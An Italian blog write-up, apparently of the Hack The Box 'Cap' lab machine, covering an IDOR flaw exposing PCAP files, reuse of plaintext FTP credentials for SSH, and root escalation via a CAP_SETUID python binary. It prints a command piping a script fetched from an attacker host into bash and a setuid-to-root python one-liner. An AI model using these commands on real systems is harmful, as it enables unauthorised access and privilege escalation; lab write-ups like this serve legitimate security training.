<!DOCTYPE html><html lang="en-gb"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Exploit della Macchina Cap di HTB - Cybergate Lab</title><meta name="description" content="Introduzione Cap √® una macchina Linux a bassa difficolt√† progettata per test di sicurezza. Al suo interno √® presente un server HTTP dedicato ad attivit√† amministrative, tra cui la cattura di traffico di rete. In questo write-up, analizzeremo come una vulnerabilit√† IDOR (Insecure Direct Object&hellip;"><meta name="generator" content="Publii Open-Source CMS for Static Site"><link rel="canonical" href="https://3nc0d3d.github.io/cybergatelab/exploit-della-macchina-cap-di-htb.html"><link rel="alternate" type="application/atom+xml" href="https://3nc0d3d.github.io/cybergatelab/feed.xml"><link rel="alternate" type="application/json" href="https://3nc0d3d.github.io/cybergatelab/feed.json"><meta property="og:title" content="Exploit della Macchina Cap di HTB"><meta property="og:image" content="https://3nc0d3d.github.io/cybergatelab/media/website/cyberSelfDefence_4.jpeg"><meta property="og:image:width" content="1024"><meta property="og:image:height" content="1024"><meta property="og:site_name" content="Cybergate Lab"><meta property="og:description" content="Introduzione Cap √® una macchina Linux a bassa difficolt√† progettata per test di sicurezza. Al suo interno √® presente un server HTTP dedicato ad attivit√† amministrative, tra cui la cattura di traffico di rete. In questo write-up, analizzeremo come una vulnerabilit√† IDOR (Insecure Direct Object&hellip;"><meta property="og:url" content="https://3nc0d3d.github.io/cybergatelab/exploit-della-macchina-cap-di-htb.html"><meta property="og:type" content="article"><link rel="stylesheet" href="https://3nc0d3d.github.io/cybergatelab/assets/css/style.css?v=0df7b7599b4f32211c318b6294ce9223"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://3nc0d3d.github.io/cybergatelab/exploit-della-macchina-cap-di-htb.html"},"headline":"Exploit della Macchina Cap di HTB","datePublished":"2025-02-15T17:22+01:00","dateModified":"2025-02-15T17:22+01:00","image":{"@type":"ImageObject","url":"https://3nc0d3d.github.io/cybergatelab/media/website/cyberSelfDefence_4.jpeg","height":1024,"width":1024},"description":"Introduzione Cap √® una macchina Linux a bassa difficolt√† progettata per test di sicurezza. Al suo interno √® presente un server HTTP dedicato ad attivit√† amministrative, tra cui la cattura di traffico di rete. In questo write-up, analizzeremo come una vulnerabilit√† IDOR (Insecure Direct Object&hellip;","author":{"@type":"Person","name":"Alessandro","url":"https://3nc0d3d.github.io/cybergatelab/authors/alessandro/"},"publisher":{"@type":"Organization","name":"Alessandro","logo":{"@type":"ImageObject","url":"https://3nc0d3d.github.io/cybergatelab/media/website/cyberSelfDefence_4.jpeg","height":1024,"width":1024}}}</script><noscript><style>img[loading] {
                    opacity: 1;
                }</style></noscript></head><body class="post-template"><header class="top js-header"><a class="logo" href="https://3nc0d3d.github.io/cybergatelab/"><img src="https://3nc0d3d.github.io/cybergatelab/media/website/cyberSelfDefence_4.jpeg" alt="Cybergate Lab" width="1024" height="1024"></a></header><main class="post"><article class="content"><div class="hero hero--noimage"><header class="hero__content"><div class="wrapper"><h1>Exploit della Macchina Cap di HTB</h1><div class="feed__meta content__meta"><a href="https://3nc0d3d.github.io/cybergatelab/authors/alessandro/" class="feed__author">Alessandro</a> <time datetime="2025-02-15T17:22" class="feed__date">Saturday, 15 February 2025</time></div></div></header></div><div class="entry-wrapper content__entry"><h1 id="introduzione">Introduzione</h1><p>Cap √® una macchina Linux a bassa difficolt√† progettata per test di sicurezza. Al suo interno √® presente un server HTTP dedicato ad attivit√† amministrative, tra cui la cattura di traffico di rete. In questo write-up, analizzeremo come una vulnerabilit√† <strong>IDOR</strong> (Insecure Direct Object Reference) abbia permesso di accedere a dati sensibili e di ottenere privilegi root tramite escalation.</p><h1 id="cos√®-lidor">Cos‚Äô√® l‚ÄôIDOR?</h1><p>L‚ÄôIDOR √® una <em>vulnerabilit√† che si verifica quando un‚Äôapplicazione espone riferimenti diretti a oggetti interni (es. ID di record, file) senza controllare i permessi dell‚Äôutente</em>. Ci√≤ consente a un attaccante di manipolare tali riferimenti per accedere a risorse non autorizzate.</p><p><strong>Esempio Pratico</strong> Supponiamo un URL come:</p><pre><code>http://esempio.com/documento/123
</code></pre><p>Se l‚Äôapplicazione non verifica che l‚Äôutente abbia i diritti per accedere al documento con ID 123, modificando questo valore (es. 124) si potrebbe accedere a documenti altrui.</p><h2 id="rischi-associati">Rischi Associati</h2><ul><li>Esposizione di dati sensibili.</li><li>Manipolazione di risorse critiche.</li><li>Difficolt√† di individuazione (bassa visibilit√†).</li></ul><h2 id="prevenzione">Prevenzione</h2><ul><li>Implementare controlli di accesso granulari.</li><li>Utilizzare identificatori non prevedibili (es. UUID).</li><li>Validare e sanificare gli input.</li><li>Loggare le attivit√† sospette.</li><li>La Vulnerabilit√† nella Macchina Cap</li><li>L‚Äôapplicazione web di Cap permetteva il download di file PCAP (acquisizioni di traffico di rete) tramite URL come:</li></ul><pre><code>http://10.10.10.56/data/2
</code></pre><p>Modificando l‚ÄôID (2, 3, ecc.), era possibile scaricare PCAP appartenenti ad altri</p><p>utenti, sfruttando proprio un IDOR.</p><p>Fasi dell‚ÄôAttacco</p><ol><li>Scansione Iniziale Dopo aver configurato la VPN per accedere alla macchina, ho utilizzato nmap per identificare le porte aperte:</li></ol><p>nmap -sV 10.10.10.56 Risultato:</p><p>Porta 21 (FTP), 22 (SSH), 80 (HTTP). 2. Exploit dell‚ÄôIDOR Modificando l‚ÄôID nell‚ÄôURL (es. <a href="http://10.10.10.56/data/3">http://10.10.10.56/data/3</a>), ho scaricato diversi file PCAP.</p><ol start="3"><li>Analisi con Wireshark Uno dei file PCAP conteneva una connessione FTP non cifrata, con credenziali in chiaro:</li></ol><p>Copy</p><p>User: nathan<br>Password: Bu‚Ä¶‚Ä¶F0RM3! 4. Accesso SSH Le stesse credenziali erano valide per il servizio SSH:</p><p>ssh <a href="mailto:&#110;&#x61;&#x74;&#104;&#x61;&#x6e;&#x40;&#49;&#x30;&#46;&#49;&#x30;&#x2e;&#49;&#x30;&#x2e;&#53;&#x36;">&#110;&#x61;&#x74;&#104;&#x61;&#x6e;&#x40;&#49;&#x30;&#46;&#49;&#x30;&#x2e;&#49;&#x30;&#x2e;&#53;&#x36;</a> Privilege Escalation: Da Utente a Root</p><ol><li>Ricerca di Vulnerabilit√† con linPEAS Cos‚Äô√® linPEAS (linux Privilege Escalation Awesome Script) Dopo aver ottenuto l‚Äôaccesso come nathan, ho trasferito lo script linPEAS per individuare vettori di escalation:</li></ol><p>Avvio di un server HTTP in locale: bashCopypython -m http.server 80 Esecuzione di linPEAS sul target:</p><p>bashCopycurl http://<ip_attaccante>/linpeas.sh | bash 2. Individuazione del Vettore Critico Lo script ha evidenziato che l‚Äôeseguibile python3.8 possedeva il capability CAP_SETUID:</ip_attaccante></p><p>/usr/bin/python3.8 = cap_setuid+ep Questa capability consente a Python di modificare l‚ÄôUID del processo, permettendo di impersonare root.</p><ol start="3"><li>Exploit Finale Per ottenere una shell root, ho eseguito:</li></ol><p>import os os.setuid(0) os.system(‚Äú/bin/bash‚Äù) Esecuzione:</p><p>python3.8 -c ‚Äòimport os; os.setuid(0); os.system(‚Äú/bin/bash‚Äù)‚Äô Risultato: Accesso come root! üîë</p><p>Conclusioni La macchina Cap dimostra due rischi critici:</p><p>IDOR: L‚Äôassenza di controlli sugli ID ha permesso l‚Äôaccesso a dati altrui. Capability Pericolose: Assegnare capability come CAP_SETUID a interpreti (es. Python) pu√≤ portare a escalation catastrofiche. Best Practice</p><p>Limitare l‚Äôuso di capability ai soli processi necessari. Revisionare periodicamente i permessi dei file. Adottare il principio del minimo privilegio. Questo caso sottolinea l‚Äôimportanza di un‚Äôigiene di sicurezza rigorosa, sia nel codice che nella configurazione di sistema.</p></div><footer class="content__footer"><div class="entry-wrapper"><p class="content__updated">This article was updated on Saturday, 15 February 2025</p><div class="content__actions"><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://3nc0d3d.github.io/cybergatelab/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://3nc0d3d.github.io/cybergatelab/authors/alessandro/" rel="author">Alessandro</a></h3></div></div></div><nav class="content__nav"><div class="wrapper"><div class="content__nav-inner"><div class="content__nav-next"><a href="https://3nc0d3d.github.io/cybergatelab/wfuzz-larma-segreta-per-il-fuzzing-di-applicazioni-web.html" class="content__nav-link" rel="next"><div><span>Next</span> Wfuzz: L‚Äôarma Segreta per il Fuzzing di Applicazioni Web</div></a></div></div></div></nav></footer></article></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><p>Powered by Publii</p></div><button onclick="backToTopFunction()" id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://3nc0d3d.github.io/cybergatelab/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://3nc0d3d.github.io/cybergatelab/assets/js/scripts.min.js?v=ffcbea6c02c8178d10092962b235a5b0"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
        for (var i = 0; i < images.length; i++) {
            if (images[i].complete) {
                images[i].classList.add('is-loaded');
            } else {
                images[i].addEventListener('load', function () {
                    this.classList.add('is-loaded');
                }, false);
            }
        }</script></body></html>